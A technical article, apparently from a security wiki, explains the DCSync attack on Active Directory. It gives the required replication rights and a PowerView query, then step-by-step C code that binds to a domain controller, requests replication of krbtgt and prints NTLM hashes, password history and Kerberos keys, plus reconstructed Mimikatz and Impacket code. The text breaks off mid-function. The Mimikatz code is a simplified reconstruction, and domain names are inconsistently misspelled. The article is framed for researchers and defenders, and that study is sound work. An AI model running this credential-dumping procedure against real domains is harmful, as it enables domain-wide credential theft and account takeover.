---
icon: rotate-exclamation
---

# DcSync

## DCSync Attack: A Deep Technical Dive into Active Directory Credential Theft

> **Note:** This article provides an in-depth technical analysis of the DCSync attack technique, including detailed API function breakdowns, network protocol analysis, and practical exploitation methods. Intended for security researchers, penetration testers, and defensive security professionals.

***

### Introduction

DCSync is one of the most powerful post-exploitation techniques in Active Directory environments. Introduced by Benjamin Delpy and Vincent Le Toux in Mimikatz (August 2015), DCSync allows an attacker to impersonate a Domain Controller and request password data from legitimate DCs without requiring code execution on the target server.

Unlike traditional credential dumping methods that require physical or remote access to extract the NTDS.dit database, DCSync operates entirely over the network using legitimate Windows replication protocols. This makes it particularly stealthy and difficult to prevent once an attacker has obtained the necessary permissions.

#### Why DCSync is Critical

* **No Code Execution Required**: Works remotely over the network
* **Leverages Legitimate Protocols**: Uses Microsoft's Directory Replication Service (DRS)
* **Minimal Forensic Footprint**: Harder to detect than traditional memory dumping
* **Extracts All Credentials**: Retrieves NTLM hashes, password history, and Kerberos keys
* **Persistence Friendly**: Can be used repeatedly without touching disk

***

### What is DCSync?

DCSync is a credential dumping technique that abuses the **MS-DRSR (Directory Replication Service Remote Protocol)** to replicate password data from a Domain Controller. It essentially tricks the DC into thinking the attacker's machine is another DC requesting legitimate replication data.

#### The Core Concept

**Normal DC Replication:** When you have multiple Domain Controllers in an Active Directory environment, they need to stay synchronized. Domain Controllers replicate data between each other using Microsoft's replication protocols. This is completely normal and expected behavior.

**The DCSync Attack:** An attacker with the right permissions tells the Domain Controller: "Hey, I'm another DC, please replicate user password data to me." The DC validates the requester has replication permissions, and if yes, it sends back the password hashes.

**Key Point:** DCSync doesn't exploit a vulnerability—it abuses a legitimate feature. If you have the right permissions, the DC will happily give you the data because it thinks you're another DC requesting normal replication.

#### Key Characteristics

| Aspect              | Details                                                 |
| ------------------- | ------------------------------------------------------- |
| **Protocol Used**   | MS-DRSR (Directory Replication Service Remote Protocol) |
| **Transport**       | RPC over TCP (Port 135 + Dynamic Ports)                 |
| **Interface UUID**  | `e3514235-4b06-11d1-ab04-00c04fc2dcd2` (DRSUAPI)        |
| **Core Function**   | `IDL_DRSGetNCChanges`                                   |
| **Authentication**  | Kerberos or NTLM                                        |
| **Required Rights** | Replication permissions on domain object                |

#### What Makes DCSync Different?

| Traditional Methods     | DCSync                         |
| ----------------------- | ------------------------------ |
| Requires DC access      | Works remotely                 |
| Reads NTDS.dit file     | Uses replication protocol      |
| Memory dumping (LSASS)  | Network-based                  |
| Needs local admin on DC | Needs replication rights       |
| High detection risk     | Blends with legitimate traffic |

***

### Required Permissions

To successfully execute DCSync, an attacker needs specific Extended Rights on the domain object. These permissions control who can replicate directory data.

#### The Three Critical Rights

**1. Replicating Directory Changes (DS-Replication-Get-Changes)**

* **GUID**: `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`
* **Purpose**: Allows replication of non-secret domain data
* **Scope**: Changes replicated to Global Catalog

**2. Replicating Directory Changes All (DS-Replication-Get-Changes-All)**

* **GUID**: `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`
* **Purpose**: Allows replication of **secret domain data** (passwords)
* **Scope**: All data including password hashes

**3. Replicating Directory Changes In Filtered Set**

* **GUID**: `89e95b76-444d-4c62-991a-0facbeda640c`
* **Purpose**: Required in some environments with RODCs
* **Scope**: Filtered attribute sets

#### Default Privileged Groups

The following groups have these rights by default:

* **Domain Admins**
* **Enterprise Admins**
* **Administrators**
* **Domain Controller** computer accounts

#### Why These Permissions Exist

These permissions are necessary for legitimate DC replication. When you promote a new Domain Controller, it needs these rights to synchronize the entire Active Directory database from existing DCs. Without these permissions, replication would fail.

#### Checking Who Has DCSync Permissions

To find who has DCSync rights in your domain, you can use PowerView:

```powershell
Get-ObjectACL -DistinguishedName "DC=local,DC=htb" -ResolveGUIDs | 
    Where-Object { 
        ($_.ObjectType -match 'replication-get') -or 
        ($_.ActiveDirectoryRights -match 'GenericAll') 
    } | Select-Object IdentityReference, ObjectType
```

***

### Under the Hood: Understanding the Functions

Before we see how everything works together, let's understand each function that DCSync uses. Most articles skip this part, but understanding these functions is crucial for both attacking and defending.

#### Function 1: DsBind() and DsBindWithCred()

These are Windows API functions that create an authenticated connection to a Domain Controller's Directory Service.

**What is DsBind?**

`DsBind()` establishes an RPC (Remote Procedure Call) connection to a Domain Controller and authenticates the user. Think of it like opening a database connection before running queries, or logging into SSH before executing commands.

**Function Signature:**

```c
DWORD DsBind(
  [in, optional] LPCTSTR  DomainControllerName,  // DC to connect to
  [in, optional] LPCTSTR  DnsDomainName,         // Domain name
  [out]          HANDLE   *phDS                  // Returned handle
);
```

**What it does:**

1. Establishes an RPC connection to the specified Domain Controller
2. Authenticates using the **current user's credentials** (Kerberos ticket or NTLM hash)
3. Returns a **handle** (`phDS`) that represents this connection
4. This handle is used for all subsequent directory service operations

**Example:**

```c
HANDLE hDS;
DWORD result = DsBind(L"DC01.loacl.htb", NULL, &hDS);

if (result == ERROR_SUCCESS) {
    // Now use hDS for other operations like DsCrackNames, IDL_DRSGetNCChanges
    printf("[+] Successfully connected to DC\n");
    
    // Do DCSync operations here...
    
    DsUnBind(&hDS);  // Close connection when done
}
```

**DsBindWithCred - The Offensive Version:**

```c
DWORD DsBindWithCred(
  [in, optional] LPCTSTR                 DomainControllerName,
  [in, optional] LPCTSTR                 DnsDomainName,
  [in, optional] RPC_AUTH_IDENTITY_HANDLE AuthIdentity,  //Explicit credentials
  [out]          HANDLE                  *phDS
);
```

**Difference:** `DsBindWithCred()` allows you to specify **explicit credentials** instead of using the current user. This is useful when you've compromised credentials and want to authenticate as a different user.

**Example with stolen creds:**

```c
SEC_WINNT_AUTH_IDENTITY authIdentity;
authIdentity.User = L"Administrator";
authIdentity.UserLength = wcslen(authIdentity.User);
authIdentity.Domain = L"LOCAL";
authIdentity.DomainLength = wcslen(authIdentity.Domain);
authIdentity.Password = L"P@ssward123";
authIdentity.PasswordLength = wcslen(authIdentity.Password);
authIdentity.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;

HANDLE hDS;
DsBindWithCred(L"DC01.loacl.htb", NULL, &authIdentity, &hDS);
```

**What Happens Under the Hood:**

When you call `DsBind()`:

1. **RPC Endpoint Resolution**: Client connects to DC port 135 (RPC Endpoint Mapper) and asks "Where is the Directory Service?"
2. **Response**: DC responds "Directory Service is on port 49XXX" (dynamic port)
3. **New Connection**: Client connects to the dynamic port
4. **Authentication**: Client authenticates using Kerberos or NTLM
5. **DRSUAPI Binding**: Client binds to the DRSUAPI interface (UUID: `e3514235-4b06-11d1-ab04-00c04fc2dcd2`)
6. **Handle Returned**: A `DRS_HANDLE` is returned for subsequent operations

**Why This Matters for DCSync:**

Without `DsBind()`, you **cannot** make any DRSUAPI calls. It's the authentication gateway. Once you have the handle from `DsBind()`, you can call the actual DCSync function `IDL_DRSGetNCChanges()`.

***

#### Function 2: DsCrackNames()

This function converts usernames between different formats.

**Function Signature:**

```c
DWORD DsCrackNames(
  [in]  HANDLE           hDS,              // Handle from DsBind()
  [in]  DS_NAME_FLAGS    flags,
  [in]  DS_NAME_FORMAT   formatOffered,    // Input format
  [in]  DS_NAME_FORMAT   formatDesired,    // Output format
  [in]  DWORD            cNames,           // Number of names
  [in]  LPTSTR           *rpNames,         // Array of names
  [out] PDS_NAME_RESULT  *ppResult         // Results
);
```

**What it does:**

Converts username formats. For example:

* Input: `DOMAIN\krbtgt` (NT4 account name format)
* Output: `CN=krbtgt,CN=Users,DC=domain,DC=local` (Distinguished Name format)

**Why This is Needed:**

The replication protocol works with **Distinguished Names (DNs)**, not SAM account names. When you want to DCSync a specific user, you typically know their username like "krbtgt" or "Administrator", but the replication function needs the full DN path.

**Example:**

```c
DS_NAME_RESULT* result;
LPWSTR targetUser = L"LOCAL\\krbtgt";

DsCrackNames(
    hDS,                          // Handle from DsBind()
    DS_NAME_FLAG_SYNTACTICAL_ONLY,
    DS_NT4_ACCOUNT_NAME,          // Input format: DOMAIN\username
    DS_FQDN_1779_NAME,            // Output format: DN
    1,                            // One name to convert
    &targetUser,
    &result
);

// result->rItems[0].pName now contains:
// "CN=krbtgt,CN=Users,DC=loacal,DC=htb"
```

**Common Name Formats:**

| Format Constant          | Example                              |
| ------------------------ | ------------------------------------ |
| `DS_NT4_ACCOUNT_NAME`    | `LOCAL\krbtgt`                       |
| `DS_FQDN_1779_NAME`      | `CN=krbtgt,CN=Users,DC=local,DC=htb` |
| `DS_USER_PRINCIPAL_NAME` | `krbtgt@`loacl.htb                   |
| `DS_CANONICAL_NAME`      | loacl.htb`/Users/krbtgt`             |

***

#### Function 3: IDL\_DRSGetNCChanges() THE ACTUAL DCSYNC FUNCTION

This is the **core function** that performs DCSync. This is NOT in the standard Windows API list it's part of the DRSUAPI RPC interface.

**Function Signature:**

```c
ULONG IDL_DRSGetNCChanges(
  [in, ref]  DRS_HANDLE           hDrs,            // Handle from DsBind()
  [in]       DWORD                dwInVersion,     // Request version (usually 8)
  [in, ref]  DRS_MSG_GETCHGREQ*   pmsgIn,          // Input structure 
  [out, ref] DWORD*               pdwOutVersion,   // Response version
  [out, ref] DRS_MSG_GETCHGREPLY* pmsgOut          // Output structure
);
```

**Critical Details:**

* **Protocol**: MS-DRSR (Directory Replication Service Remote Protocol)
* **Interface UUID**: `e3514235-4b06-11d1-ab04-00c04fc2dcd2`
* **Operation Number (opnum)**: 3
* **Official Specification**: [MS-DRSR IDL\_DRSGetNCChanges](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/b63730ac-614c-431c-9501-28d6aca91894)

**Why it's not in the Win32 API list:**

This function is part of the DRSUAPI RPC interface, not the Win32 API. It's accessed through:

* Direct RPC calls (Mimikatz)
* Impacket library (Python)
* DSInternals PowerShell module

**What This Function Does:**

`IDL_DRSGetNCChanges()` is the function Domain Controllers use to replicate directory data between each other. When you call this function with the right permissions:

1. You send a replication request specifying which object you want
2. The DC validates you have replication permissions
3. If yes, DC sends back the object's attributes, **including password hashes**
4. The hashes are encrypted during transmission but Mimikatz/Impacket decrypt them

***

#### The Input Structure: DRS\_MSG\_GETCHGREQ

This is what you send TO the Domain Controller:

```c
typedef struct {
  UUID                        uuidDsaObjDest;      // Target DC GUID
  UUID                        uuidInvocIdSrc;      // Source DC invocation ID
  DSNAME*                     pNC;                 // Target object's DN
  USN_VECTOR                  usnvecFrom;          // USN to replicate from
  UPTODATE_VECTOR_V1_EXT*     pUpToDateVecDest;    // What we already have
  ULONG                       ulFlags;             // Replication flags
  ULONG                       cMaxObjects;         // Max objects to return
  ULONG                       cMaxBytes;           // Max bytes to return
  PARTIAL_ATTR_VECTOR_V1_EXT* pPartialAttrSet;     // Specific attributes
} DRS_MSG_GETCHGREQ_V8;
```

**Important Fields Explained:**

**`pNC` (Naming Context):** This is the Distinguished Name of the object you want to replicate. For example:

* `CN=krbtgt,CN=Users,DC=local,DC=htb` - To get krbtgt's password
* `CN=Administrator,CN=Users,DC=local,DC=htb` - To get Administrator's password

**`ulFlags` (Replication Flags):** These flags tell the DC how to perform replication. Common flags:

```c
#define DRS_INIT_SYNC      0x00000020  // Initial synchronization
#define DRS_WRIT_REP       0x00000010  // Writable replica (we're a writable DC)
#define DRS_NEVER_SYNCED   0x00000100  // Never synced before
#define DRS_FULL_SYNC_NOW  0x00008000  // Full sync now
#define DRS_GET_ANC        0x00000800  // Get ancestors
```

**Typical DCSync Flag Combination:**

```c
request.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP;  // 0x00000030
```

This tells the DC: "I'm a writable Domain Controller doing initial synchronization, please give me the data."

**`cMaxObjects`:** How many objects to return. For DCSync of a single user, set to `1`.

**`cMaxBytes`:** Maximum response size. Usually set to something like `0x00a00000` (10 MB).

***

#### The Output Structure: DRS\_MSG\_GETCHGREPLY

This is what the Domain Controller sends BACK to you:

```c
typedef struct {
  UUID                    uuidDsaObjSrc;      // Source DC GUID
  UUID                    uuidInvocIdSrc;     // Invocation ID
  DSNAME*                 pNC;                // Naming context
  USN_VECTOR              usnvecFrom;         // USN replicated from
  USN_VECTOR              usnvecTo;           // USN replicated to
  UPTODATE_VECTOR_V1_EXT* pUpToDateVecSrc;    // What source has
  SCHEMA_PREFIX_TABLE     PrefixTableSrc;     // Schema prefix table
  ULONG                   ulExtendedRet;      // Extended return code
  ULONG                   cNumObjects;        // Number of objects returned
  ULONG                   cNumBytes;          // Total bytes
  REPLENTINFLIST*         pObjects;           // THE PASSWORD DATA!
  BOOL                    fMoreData;          // More data available?
} DRS_MSG_GETCHGREPLY_V6;
```

**The Magic Field: `pObjects`**

This is where the actual password data lives. It's a linked list of objects:

```c
typedef struct {
  REPLENTINFLIST* pNextEntInf;      // Next object in list
  ENTINF          Entinf;           // Object information
} REPLENTINFLIST;

typedef struct {
  DSNAME*         pName;            // Object DN
  ULONG           ulFlags;          // Flags
  ATTR_BLOCK      AttrBlock;        // Attributes (including passwords!)
} ENTINF;

typedef struct {
  ULONG  attrCount;                 // Number of attributes
  ATTR*  pAttr;                     // Array of attributes
} ATTR_BLOCK;
```

**Password Attributes in the Response:**

| Attribute Name            | Attribute ID (OID)                                        | Contains                            |
| ------------------------- | --------------------------------------------------------- | ----------------------------------- |
| `unicodePwd`              | `1.2.840.113556.1.4.90` (ATT\_UNICODE\_PWD)               | Current NTLM hash                   |
| `ntPwdHistory`            | `1.2.840.113556.1.4.94` (ATT\_NT\_PWD\_HISTORY)           | Password history (NTLM hashes)      |
| `supplementalCredentials` | `1.2.840.113556.1.4.125` (ATT\_SUPPLEMENTAL\_CREDENTIALS) | Kerberos keys (AES256, AES128, DES) |
| `lmPwdHistory`            | `1.2.840.113556.1.4.160` (ATT\_LM\_PWD\_HISTORY)          | LM hash history (if enabled)        |

**How Password Data is Stored:**

The password hashes are:

1. Encrypted with the DC's boot key (also called SysKey)
2. Encrypted again for RPC transmission using the session key
3. Mimikatz/Impacket automatically decrypt both layers to give you the plaintext NTLM hash

***

#### Function 4: DsUnBind()

This function closes the connection.

**Function Signature:**

```c
DWORD DsUnBind(
  [in, out] HANDLE *phDS
);
```

**What it does:**

* Closes the RPC connection to the Domain Controller
* Frees associated resources
* Should **ALWAYS** be called after operations complete

***

### How DCSync Works: The Complete Process

Now that you understand all the functions, let's see how they work together in phases.

#### Phase 1: Connection Establishment

**Objective:** Create an authenticated connection to the Domain Controller.

**The Process:**

The attacker machine first needs to establish an RPC connection to the Domain Controller. This happens in several steps:

1. **DNS Resolution**: Resolve the DC name to an IP address
2. **RPC Endpoint Mapper Connection**: Connect to port 135 on the DC
3. **DRSUAPI Discovery**: Ask the endpoint mapper where DRSUAPI is listening
4. **Dynamic Port Connection**: Connect to the DRSUAPI service on the dynamic port
5. **Authentication**: Authenticate using Kerberos or NTLM
6. **Bind to DRSUAPI**: Establish the DRSUAPI context

**Code:**

```c
HANDLE hDS;
LPWSTR szDC = L"DC01.loacl.htb";
LPWSTR szDomain = L"loacl.htb";

DWORD dwErr = DsBind(szDC, szDomain, &hDS);
if (dwErr == ERROR_SUCCESS) {
    printf("[+] Successfully bound to DC\n");
    printf("[+] DRS_HANDLE obtained: 0x%p\n", hDS);
}
```

**What You've Accomplished:** You now have an authenticated connection handle (`hDS`) to the Domain Controller that can be used for replication requests.

***

#### Phase 2: Name Resolution

**Objective:** Convert the target username to a Distinguished Name.

**Why This is Needed:**

The replication protocol doesn't understand usernames like "krbtgt" or "Administrator". It needs the full LDAP path (Distinguished Name). So if you want to DCSync the krbtgt account, you need to convert "LOCAL\krbtgt" into "CN=krbtgt,CN=Users,DC=local,DC=htb".

**Code:**

```c
DS_NAME_RESULT* pNameResult;
LPWSTR szNT4Name = L"LOCAL\\krbtgt";

dwErr = DsCrackNames(
    hDS,                          // Handle from DsBind()
    DS_NAME_FLAG_SYNTACTICAL_ONLY,
    DS_NT4_ACCOUNT_NAME,          // Input: DOMAIN\username
    DS_FQDN_1779_NAME,            // Output: DN format
    1,
    &szNT4Name,
    &pNameResult
);

if (dwErr == ERROR_SUCCESS && pNameResult->cItems > 0) {
    LPWSTR szDN = pNameResult->rItems[0].pName;
    printf("[+] Resolved DN: %s\n", szDN);
    // Output: CN=krbtgt,CN=Users,DC=local,DC=htb
}
```

**What You've Accomplished:** You now have the full Distinguished Name that the replication function requires.

***

#### Phase 3: Build Replication Request

**Objective:** Prepare the replication request structure.

**The Request Structure:**

You need to build a `DRS_MSG_GETCHGREQ_V8` structure that tells the DC exactly what you want to replicate.

**Code:**

```c
// Allocate and build the request
DRS_MSG_GETCHGREQ_V8 request = {0};

// Set target DN (from Phase 2)
request.pNC = (DSNAME*)malloc(sizeof(DSNAME) + (wcslen(szDN) + 1) * sizeof(WCHAR));
wcscpy(request.pNC->StringName, szDN);
request.pNC->structLen = sizeof(DSNAME) + wcslen(szDN) * sizeof(WCHAR);

// Set flags to pretend we're a DC doing initial sync
request.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP;  // 0x00000030

// We only want one user
request.cMaxObjects = 1;

// Maximum response size (10 MB)
request.cMaxBytes = 0x00a00000;

// We want all attributes (NULL means everything)
request.pPartialAttrSet = NULL;

printf("[+] Replication request prepared\n");
printf("[+] Target DN: %s\n", request.pNC->StringName);
printf("[+] Flags: 0x%08X\n", request.ulFlags);
```

**What You've Accomplished:** The replication request is ready to send to the DC.

***

#### Phase 4: Execute DCSync (The Attack)

**Objective:** Send the replication request and receive password hashes.

**The Core Attack:**

This is where the actual DCSync happens. You call `IDL_DRSGetNCChanges()` with your prepared request.

**Code:**

```c
DRS_MSG_GETCHGREPLY reply;
DWORD dwOutVersion;

printf("[*] Sending DRSGetNCChanges request...\n");

// THE ACTUAL DCSYNC CALL
dwErr = IDL_DRSGetNCChanges(
    hDS,           // Handle from DsBind()
    8,             // Request version 8
    &request,      // Input structure (what we want)
    &dwOutVersion, // Output version (DC will tell us which version it used)
    &reply         // Output structure (contains the password data!)
);

if (dwErr == ERROR_SUCCESS) {
    printf("[+] DCSync successful!\n");
    printf("[+] Response version: %d\n", dwOutVersion);
    printf("[+] Objects returned: %d\n", reply.cNumObjects);
    printf("[+] Total bytes: %d\n", reply.cNumBytes);
    printf("[+] More data available: %s\n", reply.fMoreData ? "Yes" : "No");
} else {
    printf("[!] DCSync failed with error: 0x%08X\n", dwErr);
}
```

**What Happened:**

The Domain Controller:

1. Received your replication request
2. Validated that your account has replication permissions
3. Retrieved the password data for the krbtgt account
4. Encrypted the data for transmission
5. Sent it back in the `reply` structure

**What You've Accomplished:** The password data is now in the `reply.pObjects` structure, ready to be extracted!

***

#### Phase 5: Parse Password Data

**Objective:** Extract the NTLM hash and Kerberos keys from the response.

**Understanding the Response Structure:**

The `reply.pObjects` is a linked list. Each node contains an object (in our case, just one: krbtgt). Each object has an `AttrBlock` containing all its attributes, including the password hashes.

**Code:**

```c
printf("[*] Parsing password data...\n");

REPLENTINFLIST* pObject = reply.pObjects;

while (pObject != NULL) {
    ENTINF* pEntInf = &pObject->Entinf;
    
    printf("[+] Object DN: %s\n", pEntInf->pName->StringName);
    printf("[+] Attribute count: %d\n", pEntInf->AttrBlock.attrCount);
    
    // Iterate through all attributes
    for (ULONG i = 0; i < pEntInf->AttrBlock.attrCount; i++) {
        ATTR* pAttr = &pEntInf->AttrBlock.pAttr[i];
        
        // Check attribute type
        switch (pAttr->attrTyp) {
            
            case ATT_UNICODE_PWD:  // NTLM hash
                {
                    BYTE* encryptedHash = pAttr->AttrVal.pAVal[0].pVal;
                    DWORD hashLen = pAttr->AttrVal.pAVal[0].valLen;
                    
                    // Decrypt hash (Mimikatz does this automatically)
                    DecryptPasswordHash(encryptedHash, hashLen);
                    
                    printf("[+] NTLM Hash: ");
                    for (DWORD j = 0; j < 16; j++) {
                        printf("%02x", encryptedHash[j]);
                    }
                    printf("\n");
                }
                break;
                
            case ATT_NT_PWD_HISTORY:  // Password history
                {
                    DWORD historyLen = pAttr->AttrVal.pAVal[0].valLen;
                    ULONG numHashes = historyLen / 16;  // Each hash is 16 bytes
                    
                    printf("[+] Password History:\n");
                    printf("[+] History entries: %d\n", numHashes);
                    
                    BYTE* historyData = pAttr->AttrVal.pAVal[0].pVal;
                    for (ULONG h = 0; h < numHashes; h++) {
                        printf("    ntlm-%d: ", h);
                        for (DWORD j = 0; j < 16; j++) {
                            printf("%02x", historyData[h * 16 + j]);
                        }
                        printf("\n");
                    }
                }
                break;
                
            case ATT_SUPPLEMENTAL_CREDENTIALS:  // Kerberos keys
                {
                    printf("[+] Kerberos Keys Found\n");
                    printf("[+] Supplemental Credentials:\n");
                    
                    // Parse supplemental credentials blob
                    // Contains AES256-CTS-HMAC-SHA1-96, AES128-CTS-HMAC-SHA1-96, DES-CBC-MD5
                    ParseSupplementalCredentials(pAttr->AttrVal.pAVal[0].pVal,
                                                 pAttr->AttrVal.pAVal[0].valLen);
                }
                break;
        }
    }
    
    pObject = pObject->pNextEntInf;  // Move to next object (if any)
}

printf("[+] Password extraction complete!\n");
```

**What You've Accomplished:** You've extracted all the password data! You now have:

* Current NTLM hash
* Password history (previous NTLM hashes)
* Kerberos keys (AES256, AES128, DES)

***

#### Phase 6: Cleanup

**Objective:** Close the connection and free resources.

**Code:**

```c
// Free the name resolution result
DsFreeNameResult(pNameResult);

// Free the request structure
free(request.pNC);

// Unbind from the DC
DsUnBind(&hDS);

printf("[+] Connection closed\n");
printf("[+] DCSync operation complete!\n");
```

**What You've Accomplished:** Clean exit with no resource leaks.

***

### Code Implementation Analysis

Now let's look at how real tools implement DCSync.

#### Mimikatz Implementation

Mimikatz is written in C and directly calls the Windows APIs and DRSUAPI functions.

**Main File:** `mimikatz/modules/kuhl_m_lsadump.c`

**Entry Point Function:** `kuhl_m_lsadump_dcsync()`

```c
BOOL kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
{
    HANDLE hDS;
    LPWSTR szDC = NULL, szDomain = NULL, szUser = NULL;
    DWORD dwErr;
    
    // Parse command line arguments
    // Example: lsadump::dcsync /domain:loacl.htb /user:krbtgt
    kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL);
    kull_m_string_args_byName(argc, argv, L"dc", &szDC, NULL);
    kull_m_string_args_byName(argc, argv, L"user", &szUser, L"krbtgt");
    
    kprintf(L"[DC] \'%s\' will be the DC server\n", szDC ? szDC : L"<auto>");
    kprintf(L"[DC] Object RDN: %s\n\n", szUser);
    
    // Step 1: Bind to Domain Controller
    dwErr = DsBind(szDC, szDomain, &hDS);
    if(dwErr == ERROR_SUCCESS)
    {
        // Step 2-5: Do the actual DCSync
        kuhl_m_lsadump_dcsync_descrObject(hDS, szDomain, szUser);
        
        // Step 6: Unbind
        DsUnBind(&hDS);
    }
    else
    {
        kprintf(L"[!] DsBind failed with error: %u\n", dwErr);
    }
    
    return (dwErr == ERROR_SUCCESS);
}
```

**The Core DCSync Implementation:**

```c
BOOL kuhl_m_lsadump_dcsync_descrObject(HANDLE hDS, LPCWSTR szDomain, LPCWSTR szUser)
{
    DWORD dwErr;
    DRS_MSG_GETCHGREQ_V8 request = {0};
    DRS_MSG_GETCHGREPLY reply;
    DWORD dwOutVersion;
    LPWSTR szUserDN = NULL;
    
    // Resolve username to DN using DsCrackNames
    dwErr = kuhl_m_lsadump_dcsync_getUserDN(hDS, szDomain, szUser, &szUserDN);
    if(dwErr != ERROR_SUCCESS) {
        kprintf(L"[!] Failed to resolve user DN\n");
        return FALSE;
    }
    
    kprintf(L"[DC] User DN: %s\n", szUserDN);
    
    // Build replication request
    kuhl_m_lsadump_dcsync_buildRequest(&request, szUserDN);
    
    // Call IDL_DRSGetNCChanges
    dwErr = IDL_DRSGetNCChanges(hDS, 8, &request, &dwOutVersion, &reply);
    
    if(dwErr == ERROR_SUCCESS)
    {
        kprintf(L"\n** SAM ACCOUNT **\n\n");
        
        // Parse and display password data
        kuhl_m_lsadump_dcsync_decrypt(&reply);
    }
    else
    {
        kprintf(L"[!] DRSGetNCChanges failed: %u\n", dwErr);
    }
    
    return (dwErr == ERROR_SUCCESS);
}
```

**Password Decryption Function:**

```c
BOOL kuhl_m_lsadump_dcsync_decrypt(DRS_MSG_GETCHGREPLY *reply)
{
    REPLENTINFLIST* pObject = reply->pObjects;
    BYTE ntlmHash[16];
    BYTE* pHistory;
    
    while(pObject)
    {
        // Display basic account info
        kprintf(L"SAM Username         : %s\n", GetAttributeValue(pObject, ATT_SAM_ACCOUNT_NAME));
        kprintf(L"User Principal Name  : %s\n", GetAttributeValue(pObject, ATT_USER_PRINCIPAL_NAME));
        
        kprintf(L"\nCredentials:\n");
        
        // Extract and decrypt password attributes
        for(ULONG i = 0; i < pObject->Entinf.AttrBlock.attrCount; i++)
        {
            ATTR *attr = &pObject->Entinf.AttrBlock.pAttr[i];
            
            switch(attr->attrTyp)
            {
                case ATT_UNICODE_PWD:
                    // Decrypt current NTLM hash
                    DecryptAttributeValue(attr, ntlmHash, 16);
                    
                    kprintf(L"  Hash NTLM: ");
                    kull_m_string_wprintf_hex(ntlmHash, 16, 0);
                    kprintf(L"\n");
                    break;
                    
                case ATT_NT_PWD_HISTORY:
                    // Decrypt password history
                    DWORD historyCount = attr->AttrVal.pAVal[0].valLen / 16;
                    pHistory = DecryptAttributeValue(attr, NULL, 0);
                    
                    for(DWORD h = 0; h < historyCount; h++) {
                        kprintf(L"    ntlm-%d: ", h);
                        kull_m_string_wprintf_hex(pHistory + (h * 16), 16, 0);
                        kprintf(L"\n");
                    }
                    break;
                    
                case ATT_SUPPLEMENTAL_CREDENTIALS:
                    // Parse and display Kerberos keys
                    kprintf(L"\nSupplemental Credentials:\n");
                    kprintf(L"* Primary:Kerberos-Newer-Keys *\n");
                    
                    ParseKerberosKeys(attr);
                    break;
            }
        }
        
        pObject = pObject->pNextEntInf;
    }
    
    return TRUE;
}
```

***

#### Impacket Implementation (secretsdump.py)

Impacket is a Python library that reimplements Windows protocols. The DCSync functionality is in `secretsdump.py`.

**Main Class:** `DRSUAPIDumpSecrets`

**File:** `impacket/examples/secretsdump.py`

```python
class DRSUAPIDumpSecrets:
    def __init__(self, remoteName, username='', password='', domain='', 
                 options=None):
        self.__remoteName = remoteName
        self.__remoteHost = remoteName
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__hashes = options.hashes if options else None
        
    def dump(self, usernames=[]):
        """
        Main DCSync function
        """
        logging.info('Connecting to %s' % self.__remoteName)
        
        # Step 1: Establish RPC connection
        stringBinding = r'ncacn_ip_tcp:%s[135]' % self.__remoteName
        rpctransport = transport.DCERPCTransportFactory(stringBinding)
        rpctransport.setRemoteHost(self.__remoteHost)
        
        # Set authentication
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(self.__username, 
                                         self.__password, 
                                         self.__domain,
                                         self.__lmhash, 
                                         self.__nthash)
        
        # Connect and bind to DRSUAPI
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(drsuapi.MSRPC_UUID_DRSUAPI)
        
        logging.info("Binding successful")
        
        # Step 2: DRSBind (equivalent to DsBind in C)
        request = drsuapi.DRSBind()
        request['puuidClientDsa'] = drsuapi.NTDSAPI_CLIENT_GUID
        
        # Set extensions
        drs = drsuapi.DRS_EXTENSIONS_INT()
        drs['cb'] = len(drs)
        drs['dwFlags'] = (drsuapi.DRS_EXT_GETCHGREQ_V6 | 
                          drsuapi.DRS_EXT_GETCHGREPLY_V6 | 
                          drsuapi.DRS_EXT_GETCHGREQ_V8 |
                          drsuapi.DRS_EXT_STRONG_ENCRYPTION)
        
        request['pextClient']['cb'] = len(drs)
        request['pextClient']['rgb'] = list(str(drs))
        
        resp = dce.request(request)
        self.__hDrs = resp['phDrs']
        
        logging.info("DRSBind successful, handle: %s" % self.__hDrs)
        
        # Step 3: Get domain info
        self.__NtdsDsaObjectGuid = resp['ppdsaExt']['Guid']
        
        # Step 4-5: Replicate each user
        if not usernames:
            # Get all users
            usernames = ['krbtgt']
        
        for username in usernames:
            logging.info('Replicating user %s' % username)
            self.__dcSync(username)
        
        # Step 6: Cleanup
        dce.disconnect()
        
    def __dcSync(self, username):
        """
        Perform DCSync for a specific user
        """
        # Resolve username to DN using DRSCrackNames
        logging.info('Resolving DN for %s' % username)
        
        resp = drsuapi.hDRSCrackNames(
            self.__dce, 
            self.__hDrs, 
            0,
            drsuapi.DS_NT4_ACCOUNT_NAME,
            drsuapi.DS_FQDN_1779_NAME,
            name='%s\\%s' % (self.__domain, username)
        )
        
        if resp['pmsgOut']['V1']['pResult']['cItems'] == 0:
            logging.error('User %s not found' % username)
            return
        
        userDN = resp['pmsgOut']['V1']['pResult']['rItems'][0]['pName']
        logging.info('User DN: %s' % userDN)
        
        # Build DRSGetNCChanges request
        request = drsuapi.DRSGetNCChanges()
        request['hDrs'] = self.__hDrs
        request['dwInVersion'] = 8
        
        # Build request structure
        request['pmsgIn']['tag'] = 8
        request['pmsgIn']['V8']['uuidDsaObjDest'] = self.__NtdsDsaObjectGuid
        request['pmsgIn']['V8']['uuidInvocIdSrc'] = self.__NtdsDsaObjectGuid
        
        # Set target DN
        dsName = drsuapi.DSNAME()
        dsName['SidLen'] = 0
        dsName['Guid'] = string_to_bin('00000000-0000-0000-0000-000000000000')
        dsName['Sid'] = ''
        dsName['NameLen'] = len(userDN)
        dsName['StringName'] = (userDN + '\x00')
        
        request['pmsgIn']['V8']['pNC'] = dsName
        request['pmsgIn']['V8']['ulFlags'] = (drsuapi.DRS_INIT_SYNC | 
                                               drsuapi.DRS_WRIT_REP)
        request['pmsgIn']['V8']['cMaxObjects'] = 1
        request['pmsgIn']['V8']['cMaxBytes'] = 0
        request['pmsgIn']['V8']['ulExtendedOp'] = 0
        
        # Send the request
        logging.info('Sending DRSGetNCChanges request...')
        resp = self.__dce.request(request)
        
        # Parse response
